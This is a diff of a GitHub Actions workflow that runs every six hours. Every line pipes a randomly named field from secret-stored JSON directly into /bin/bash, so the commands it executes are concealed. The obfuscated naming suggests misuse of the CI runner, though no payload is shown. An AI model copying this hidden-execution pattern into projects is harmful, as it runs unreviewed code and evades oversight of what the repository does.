@@ -3,8 +3,7 @@ name: qinmianhong6234
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 3/6 * * *'
-
+    - cron: '23 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,18 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: qinmianhong6234
         env:
-          lr6037: ${{ secrets.lr6037 }}
+          ayfk39787: ${{ secrets.ayfk39787 }}
         run: |
-          echo $lr6037 | jq -r .gwzxk8914 | /bin/bash
-          echo $xvid2 | jq -r .mq06 | /bin/bash
-          echo $mfy7694 | jq -r .mi4 | /bin/bash
-          echo $we2 | jq -r .aifgi93162 | /bin/bash
-          echo $e46542 | jq -r .hqu27030 | /bin/bash
-          echo $xst47738 | jq -r .ganj77 | /bin/bash
-          echo $wnqfv1 | jq -r .nra282 | /bin/bash
-          echo $qblg1 | jq -r .nbkt79891 | /bin/bash
-          echo $mjeu394 | jq -r .mov72 | /bin/bash
-          echo $mqjl2500 | jq -r .ilyn85 | /bin/bash
-          echo $jdmzp78679 | jq -r .fs57329 | /bin/bash
-          echo $xpto28 | jq -r .apaav450 | /bin/bash
+          echo $ayfk39787 | jq -r .mgiin25048 | /bin/bash
+          echo $hbnf5 | jq -r .frme24806 | /bin/bash
+          echo $usv38051 | jq -r .mq651 | /bin/bash
+          echo $w34 | jq -r .gm8 | /bin/bash
+          echo $vhbpf79166 | jq -r .zxbri0477 | /bin/bash
+          echo $lmc24282 | jq -r .ssav198 | /bin/bash
+          echo $aum83829 | jq -r .nqt84 | /bin/bash
+          echo $tquq33 | jq -r .wzvgh0 | /bin/bash
+          echo $zp0113 | jq -r .gfzvf8 | /bin/bash
 
